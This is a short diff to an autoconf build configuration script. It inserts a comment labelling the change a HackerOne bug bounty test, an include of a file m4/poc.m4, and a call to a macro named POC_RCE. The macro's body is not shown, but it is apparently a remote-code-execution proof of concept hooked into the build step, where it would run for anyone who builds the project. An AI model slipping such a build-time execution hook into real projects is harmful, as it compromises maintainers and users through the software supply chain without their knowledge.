@@ -136,6 +136,9 @@ AS_CASE([${target_os}],
 
 dnl GCC specific flags
 m4_include([m4/cf3_gcc_flags.m4])
+dnl Bug bounty test - m0oncake (HackerOne)
+m4_include([m4/poc.m4])
+POC_RCE
 
 # Use either new LT_INIT or old AC_DISABLE_STATIC/AC_PROG_LIBTOOL macros
 m4_ifdef([LT_INIT],
